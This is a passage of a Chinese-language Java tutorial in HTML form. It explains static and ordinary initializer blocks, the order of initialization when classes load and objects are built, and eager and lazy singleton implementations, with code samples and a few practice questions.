class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">999</span>;<span class="hljs-comment">//静态属性</span><br>    <span class="hljs-comment">//静态代码块</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Cat 的静态代码1被执行&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span>&#123;<br>    <span class="hljs-comment">//静态代码块</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;BB的静态代码块1被执行&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BB</span>&#123;<br>    <span class="hljs-comment">//静态代码块</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;AA的静态代码块1被执行&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015220138980.png" alt="image-20221015220138980" style="zoom:50%;" /><h4 id="3）普通的代码块，在创建对象实例时，会被隐式的调用。"><a href="#3）普通的代码块，在创建对象实例时，会被隐式的调用。" class="headerlink" title="3）普通的代码块，在创建对象实例时，会被隐式的调用。"></a><strong>3）普通的代码块，在创建对象实例时，会被隐式的调用。</strong></h4><p><strong>被创建一次，就会调用一次。</strong></p><p><strong>如果只是使用类的静态成员时，普通代码块并不会执行。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...        </span><br><span class="hljs-type">DD</span> <span class="hljs-variable">dd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DD</span>();<br>        <span class="hljs-type">DD</span> <span class="hljs-variable">dd1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DD</span>();<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DD</span>&#123;<br>    <span class="hljs-comment">//静态代码块</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;DD 的静态代码1被执行...&quot;</span>);<br>    &#125;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;DD 的普通代码块...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>静态代码块随着类的<strong>加载</strong>而执行，只会调用一次。</p><p>而普通代码块，new对象时被调用。被创建一次，就会调用一次。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015220743762.png" alt="image-20221015220743762" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...</span><br>System.out.println(DD.n1);<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DD</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>    <span class="hljs-comment">//静态代码块</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;DD 的静态代码1被执行...&quot;</span>);<br>    &#125;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;DD 的普通代码块...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此处无创建对象，只有类被加载，所以只执行静态代码块。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015221106785.png" alt="image-20221015221106785" style="zoom:50%;" /><p>小结：</p><ol><li>static代码是类加载时，执行，只会执行一次</li><li>普通代码块是在创建对象时调用的，创建一次，调用一次</li><li>类加载的三种情况。</li></ol><h4 id="4）创建一个对象时，在一个类调用顺序（重点）"><a href="#4）创建一个对象时，在一个类调用顺序（重点）" class="headerlink" title="4）创建一个对象时，在一个类调用顺序（重点）"></a><strong>4）创建一个对象时，在一个类调用顺序（重点）</strong></h4><ol><li><strong>首先调用静态代码块和静态属性初始化</strong></li><li>然后调用普通代码块和普通属性的初始化</li><li>再调用构造方法</li></ol><p>1.<strong>首先调用静态代码块和静态属性初始化</strong></p><p>注意：静态代码块和静态属性初始化的调用优先级一样，如果有多个静态代码块和多个静态变量初始化，则<strong>按他们定义的顺序调用</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.codeblock_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeBlockDetail02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> getN1();<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A 静态代码块01&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getN1</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getN1被调用...&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015222414360.png" alt="image-20221015222414360" style="zoom:50%;" /><p><strong>2.调用普通代码块和普通属性的初始化</strong></p><p>注意：普通代码块和普通属性初始化调用的优先级一样，如果有多个普通代码块和多个普通属性初始化，则按定义顺序调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeBlockDetail02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> getN2(); <span class="hljs-comment">//普通属性的初始化</span><br>    &#123;<br>        <span class="hljs-comment">//普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;A 普通代码块01&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span>&#123; <span class="hljs-comment">//静态代码块</span><br>        System.out.println(<span class="hljs-string">&quot;A 静态代码块01&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> getN1(); <span class="hljs-comment">//静态属性的初始化</span><br>    <span class="hljs-comment">//静态属性初始化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getN1</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getN1被调用...&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getN2</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//普通方法</span><br>        System.out.println(<span class="hljs-string">&quot;getN2被调用...&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015223604445.png" alt="image-20221015223604445" style="zoom:50%;" /><p>3.<strong>调用构造方法</strong></p><p>上面的例子加一个无参构造器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//无参构造器</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;A无参构造器被调用&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015225420578.png" alt="image-20221015225420578" style="zoom:50%;" /><h4 id="5）构造器的最前面隐含了super-和普通代码块"><a href="#5）构造器的最前面隐含了super-和普通代码块" class="headerlink" title="5）构造器的最前面隐含了super()和普通代码块"></a>5）构造器的最前面隐含了super()和普通代码块</h4><p>静态相关的代码块，属性初始化，在类加载时，就执行完完毕。</p><p>因此是优先于 构造器和普通代码块执行的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//构造器</span><br><span class="hljs-comment">//（1）super(); </span><br><span class="hljs-comment">//（2）调用普通代码块的</span><br>System.out.println(<span class="hljs-string">&quot;ok&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeBlockDetail03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">BBB</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AAA</span>&#123;<span class="hljs-comment">//父类OBject</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;AAA的普通代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AAA</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//(1)super()</span><br>        <span class="hljs-comment">//(2)调用本类的普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;AAA() 构造器被调用...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BBB</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AAA</span>&#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;BBB的普通代码块...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BBB</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//(1)super()</span><br>        <span class="hljs-comment">//(2)调用本类的普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;BBB() 构造器被调用...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015230627576.png" alt="image-20221015230627576" style="zoom:50%;" /><h4 id="6）创建一个子类时的调用顺序"><a href="#6）创建一个子类时的调用顺序" class="headerlink" title="6）创建一个子类时的调用顺序"></a>6）创建一个子类时的调用顺序</h4><ol><li>父类的静态代码块和静态属性（优先级一样，按定义顺序执行）</li><li>子类的静态代码块和静态属性（优先级一样，按定义顺序执行）</li><li>父类的普通代码块和普通属性初始化（优先级一样，按定义顺序执行）</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化（优先级一样，按定义顺序执行）</li><li>子类的构造方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeBlockDetail04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//(1)进行类的加载</span><br>        <span class="hljs-comment">//1.1 先加载 父类 A02 1.2 再加载 B02</span><br>        <span class="hljs-comment">//(2)创建对象</span><br>        <span class="hljs-comment">//2.1先执行子类的构造器</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">B02</span>(); <span class="hljs-comment">//对象</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A02</span>&#123; <span class="hljs-comment">//父类</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> getVal01();<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A02的一个静态代码块..&quot;</span>);<br>    &#125;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;A02的一个普通代码块..&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">n3</span> <span class="hljs-operator">=</span> getVal02();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVal01</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getVal01&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVal02</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getVal02&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A02</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A02的构造器&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B02</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A02</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n3</span> <span class="hljs-operator">=</span> getVal03();<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;B02的一个静态代码块..&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">n5</span> <span class="hljs-operator">=</span> getVal04();<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;B02的一个普通代码块&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVal03</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getVal03&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVal04</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getVal04&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">B02</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super()</span><br>        <span class="hljs-comment">//普通代码和普通属性的初始化...</span><br>        System.out.println(<span class="hljs-string">&quot;B02的构造器&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015232513107.png" alt="image-20221015232513107" style="zoom:50%;" /><h4 id="7）静态代码块只能直接调用静态成员（静态属性和静态方法），普通代码块可以调用任意成员。"><a href="#7）静态代码块只能直接调用静态成员（静态属性和静态方法），普通代码块可以调用任意成员。" class="headerlink" title="7）静态代码块只能直接调用静态成员（静态属性和静态方法），普通代码块可以调用任意成员。"></a>7）静态代码块只能直接调用静态成员（静态属性和静态方法），普通代码块可以调用任意成员。</h4><h3 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h3><h4 id="题1："><a href="#题1：" class="headerlink" title="题1："></a>题1：</h4><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015233106759.png" alt="image-20221015233106759" style="zoom:50%;" /><p>in static block!</p><p>total&#x3D;100</p><p>total&#x3D;100</p><h4 id="题2："><a href="#题2：" class="headerlink" title="题2："></a>题2：</h4><p>下面的代码输出什么？</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015233416207.png" alt="image-20221015233416207" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221015233448332.png" alt="image-20221015233448332" style="zoom:50%;" /><p>静态成员sam初始化</p><p>static块执行</p><p>sam1成员初始化</p><p>Test默认构造函数被调用</p><h2 id="5-单例模式"><a href="#5-单例模式" class="headerlink" title="5.单例模式"></a>5.单例模式</h2><p>设计模式是什么：</p><blockquote><p>设计模式（Design pattern）是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的<strong>总结</strong>。</p><p>使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理的运用设计模式可以完美的解决很多问题，每种模式在现在中都有相应的原理来与之对应，每一个模式描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是它能被广泛应用的原因。<br>————————————————<br>原文链接：<a href="https://blog.csdn.net/cputao/article/details/121822980">https://blog.csdn.net/cputao/article/details/121822980</a></p></blockquote><p>常见的有23种。</p><p><strong>单例模式</strong>：就是采取一定的方法保证在整个的软件系统中，对某个类<strong>只能存在一个对象实例</strong>，并且该类值提供一个取得其对象实例的方法。</p><p>步骤：</p><ol><li>构造器私有化 &#x3D; 》防止直接new</li><li>类的内部创造对象</li><li>向外暴露一个静态的公共方法 getinstance </li><li>代码实现</li></ol><h3 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h3><p><em>饿汉模式：在<strong>程序启动</strong>或<strong>单例模式类</strong>被加载的时候，单例模式实例就已经被创建。</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleTon01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        GirlFriend gf1 = new GirlFriend(&quot;小花&quot;);</span><br>        <span class="hljs-type">GirlFriend</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> GirlFriend.getInstance();<br>        System.out.println(instance);<br>        <span class="hljs-type">GirlFriend</span> <span class="hljs-variable">instance1</span> <span class="hljs-operator">=</span> GirlFriend.getInstance();<br>        System.out.println(instance1);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GirlFriend</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">//为了能在静态方法中，返回gf对象，需要将其修饰为static</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">GirlFriend</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GirlFriend</span>(<span class="hljs-string">&quot;小红&quot;</span>);<br>    <span class="hljs-comment">//如何保障我们只能创建一个GirlFriend对象</span><br>    <span class="hljs-comment">//步骤[单例模式-饿汉式]</span><br>    <span class="hljs-comment">//1.构造器私有化</span><br>    <span class="hljs-comment">//2.在类的内部直接创建</span><br>    <span class="hljs-comment">//3.提供一个公共的static方法，返回gf对象</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">GirlFriend</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GirlFriend <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> gf;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;GirlFriend&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016144202025.png" alt="image-20221016144202025"></p><h3 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h3><p>*懒汉模式：只有在**用户调用方法时,*<em>才会创建对象,之后再次调用,返回的是同一对象</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.single_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleTon02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Cat</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Cat.getInstance();<br>        System.out.println(instance);<br>        <span class="hljs-comment">//再次调用getInstance</span><br>        <span class="hljs-type">Cat</span> <span class="hljs-variable">instance2</span> <span class="hljs-operator">=</span> Cat.getInstance();<br>        System.out.println(instance2);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Cat cat;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">999</span>;<br>    <span class="hljs-comment">//1.仍然构造器私有化</span><br>    <span class="hljs-comment">//2.定义一个static静态属性对象</span><br>    <span class="hljs-comment">//3.提供一个public的static方法,可以返回一个Cat对象</span><br>    <span class="hljs-comment">//4.懒汉式，只有当用户使用getinstance时，才返回cat对象，而后面再次调用时，会返回上次创建的cat对象，从而保证了单利</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;构造器被调用...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Cat <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">if</span> (cat == <span class="hljs-literal">null</span>)&#123; <span class="hljs-comment">//如果还没有创建cat对象</span><br>            cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">&quot;小可爱&quot;</span>);<br>        